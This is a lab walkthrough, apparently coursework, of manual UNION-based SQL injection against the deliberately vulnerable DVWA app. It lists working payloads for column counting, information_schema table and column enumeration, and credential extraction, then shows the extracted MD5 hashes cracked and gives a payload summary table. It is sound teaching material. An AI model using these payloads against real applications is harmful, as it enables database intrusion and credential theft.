# UNION-Based SQL Injection: Complete Table Enumeration Walkthrough

**Target:** DVWA (Security: Low)
**Database:** MySQL / MariaDB
**Week:** 8 — Continuation of Week 7 credential extraction
**Approach:** Manual payloads only

---

## Methodology Overview

UNION-based SQLi extraction follows a fixed sequence. Each phase depends on information from the previous one:

```
Phase 1: Confirm injection point
         ↓
Phase 2: Determine column count (ORDER BY method)
         ↓
Phase 3: Validate with NULL method
         ↓
Phase 4: Map output positions
         ↓
Phase 5: Extract database metadata (information_schema)
         ↓
Phase 6: Extract target data
```

Skipping phases leads to syntax errors or empty results. The sequence exists because:
- UNION requires exact column count match
- `information_schema` requires knowing the database name
- Credential extraction requires knowing column names

---

## Phase 1: Confirm Injection Point

**Payload:** `'`

**Response:**
```
You have an error in your SQL syntax; check the manual that
corresponds to your MariaDB server version...
```

**Confirmed:** The `id` parameter concatenates user input directly into the SQL query without sanitization.

---

## Phase 2: Column Count via ORDER BY

`ORDER BY N` references the Nth column in the SELECT list. If N exceeds the actual column count, the database throws an error.

### Payload: `' ORDER BY 1-- -`
**Response:** Normal page output
**Conclusion:** At least 1 column exists

### Payload: `' ORDER BY 2-- -`
**Response:** Normal page output
**Conclusion:** At least 2 columns exist

### Payload: `' ORDER BY 3-- -`
**Response:** Error — `Unknown column '3' in 'order clause'`
**Conclusion:** Exactly 2 columns in the SELECT statement

**Injected query structure:**
```sql
SELECT first_name, last_name FROM users WHERE user_id = '' ORDER BY 3-- -'
                                                                    ^
                                             References 3rd column that doesn't exist
```

---

## Phase 3: Validate Column Count with NULL Method

`NULL` is accepted by any column data type (text, integer, date). Using NULL instead of literal values confirms the UNION structure is correct without data type mismatch errors.

### Payload: `' UNION SELECT NULL, NULL-- -`

**Response:** Page renders without error

**What this confirms:**
- UNION SELECT with exactly 2 columns works
- No data type conflicts
- UNION is allowed (not filtered)

**What this does NOT confirm:**
- Which column position outputs to the page
- Whether either column is visible in the HTML

This is column count validation, not position mapping. The next phase handles position mapping.

---

## Phase 4: Column Position Mapping

Replace NULL with visible marker values to identify which column appears in which output field.

### Payload: `0' UNION SELECT 1, 2-- -`

**Response:** Page shows `1` in the First Name field, `2` in the Surname field

**Why `id=0` instead of `id=1`:**
- `id=1` returns the real admin row AND the UNION row (two rows visible)
- `id=0` matches no real user — only the UNION row appears
- Cleaner output: only injected data displays, no noise from real rows

**Mapping confirmed:**
```
UNION column position 1 → "First name" field in HTML output
UNION column position 2 → "Surname" field in HTML output
```

Both positions output to the page and accept string data. Ready for data extraction.

---

## Phase 5: Database Metadata Extraction

### 5a: Database and User Context

**Payload:** `0' UNION SELECT database(), user()-- -`

**Response:**
```
First name: dvwa
Surname:    app@localhost
```

| Data | Value | Use |
|------|-------|-----|
| `database()` | `dvwa` | Filter `information_schema` queries to this schema |
| `user()` | `app@localhost` | Confirms non-root DB account |

**Why `database()` matters:**
`information_schema.tables` contains ALL databases on the server. Without the `WHERE table_schema=database()` filter, results include system tables from `mysql`, `performance_schema`, etc. — hundreds of irrelevant rows.

---

### 5b: Table Enumeration

**Payload:**
```sql
0' UNION SELECT null, table_name FROM information_schema.tables
WHERE table_schema=database()-- -
```

**Response:**
```
First name: NULL
Surname:    guestbook

First name: NULL
Surname:    users
```

**Tables found in `dvwa` database:**

| Table | Assessment |
|-------|-----------|
| `guestbook` | Low value — user-submitted content |
| `users` | **Critical** — authentication credentials |

**Why `information_schema` is accessible:**
MySQL/MariaDB grants `SELECT` on `information_schema` to all authenticated database users by default. The application's `app@localhost` account has no special privileges — this is a standard MySQL behavior that attackers exploit universally.

---

### 5c: Column Enumeration (Target: `users`)

**Payload:**
```sql
0' UNION SELECT null, column_name FROM information_schema.columns
WHERE table_name='users' AND table_schema=database()-- -
```

**Response:**
```
user_id
first_name
last_name
user
password
avatar
last_login
failed_login
```

**High-value columns identified:**

| Column | Content |
|--------|---------|
| `user` | Login username |
| `password` | Password hash (MD5) |

---

## Phase 6: Credential Extraction

**Payload:** `0' UNION SELECT user, password FROM users-- -`

**Response:**

| First Name (= `user`) | Surname (= `password`) |
|----------------------|----------------------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |

**Hash analysis:** 32-character hexadecimal = MD5 (cryptographically broken, no salt)

**Cracked credentials (via CrackStation.net):**

| Username | Hash | Plaintext |
|----------|------|-----------|
| admin | 5f4dcc3b... | password |
| gordonb | e99a18c4... | abc123 |
| 1337 | 8d3533d7... | charley |
| pablo | 0d107d09... | letmein |
| smithy | 5f4dcc3b... | password |

**Observation:** admin and smithy share identical hashes → identical passwords. MD5 without salt: two users with the same password always produce the same hash.

---

## Complete Attack Timeline

```
T+0:00  Payload: '
        Result: MariaDB syntax error → injection confirmed

T+0:05  Payload: ' ORDER BY 2 → normal
                 ' ORDER BY 3 → error
        Result: Exactly 2 columns

T+0:10  Payload: ' UNION SELECT NULL, NULL
        Result: No error → column count validated

T+0:15  Payload: 0' UNION SELECT 1, 2
        Result: 1 → First name, 2 → Surname (both positions writable)

T+0:20  Payload: 0' UNION SELECT database(), user()
        Result: dvwa / app@localhost

T+0:25  Payload: information_schema.tables WHERE table_schema=database()
        Result: guestbook, users

T+0:30  Payload: information_schema.columns WHERE table_name='users'
        Result: user_id, first_name, last_name, user, password...

T+0:35  Payload: 0' UNION SELECT user, password FROM users
        Result: 5 credential pairs extracted

T+0:40  Hash cracking: MD5 identified, all 5 cracked instantly
        Total requests: ~12 manual requests
```

---

## Payload Summary Reference

| Phase | Payload | Purpose |
|-------|---------|---------|
| Injection | `'` | Confirm injection |
| Column count | `' ORDER BY 3-- -` (error) | Find exact column count |
| NULL validate | `' UNION SELECT NULL, NULL-- -` | Validate UNION structure |
| Position map | `0' UNION SELECT 1, 2-- -` | Map columns to output fields |
| DB context | `0' UNION SELECT database(), user()-- -` | Get current DB name |
| Table enum | `0' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()-- -` | List all tables |
| Column enum | `0' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'-- -` | List columns |
| Data extract | `0' UNION SELECT user, password FROM users-- -` | Extract credentials |

---

## Comment Syntax Note

All payloads use `-- -` (dash-dash-space-dash):

```
--     MySQL/MariaDB: requires space after -- to be valid comment
-- -   Space is guaranteed (between -- and -), trailing - prevents stripping
#      MySQL-only alternative, ANSI non-standard
/**/   Block comment, works across all databases
```

`-- -` is the professional standard for MySQL/MariaDB manual testing.

---

**Status:** Week 8 UNION Enumeration | Complete Manual Chain Documented
